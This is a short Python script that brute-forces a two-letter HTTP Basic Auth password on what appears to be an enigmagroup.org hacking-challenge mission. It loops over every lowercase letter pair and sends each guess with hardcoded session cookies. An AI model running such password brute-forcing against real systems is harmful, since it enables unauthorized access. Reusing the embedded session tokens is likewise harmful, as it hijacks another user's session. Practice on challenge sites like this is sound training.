import requests

cookies = {'enigmafiedV4': 'a%3A4%3A%7Bi%3A0%3Bs%3A5%3A%2236930%22%3Bi%3A1%3Bs%3A40%3A%22034233a09d11d67c4c56b214d7e23a3077140665%22%3Bi%3A2%3Bi%3A1586543529%3Bi%3A3%3Bi%3A2%3B%7D',
        'Usr': 'JulianaTheory',
        'SessId': 'a53201d5839970946e73d8aac21f8877'
        }

# url = 'http://www.enigmagroup.org/missions/realistics/4/sekretadminar3a/'
alphabet = 'abcdefghijklmnopqrstuvwxyz'
# r = requests.get('http://ZedX:pi@www.enigmagroup.org/missions/realistics/4/sekretadminar3a/', cookies=cookies)
# print r.content

for c in alphabet:
    for d in alphabet:
        # guess = c+d
        # print 'guess is', guess
        url = 'http://ZedX:' + c+d + '@www.enigmagroup.org/missions/realistics/4/sekretadminar3a/'
        r = requests.get(url, cookies=cookies)
        # print r.status_code
        # print r.content
        # if 'Authorization Required' not in r.content:
        #     print 'password is', guess
        #     break
        if 'Cricke7s' in r.content:
            print c+d
            break
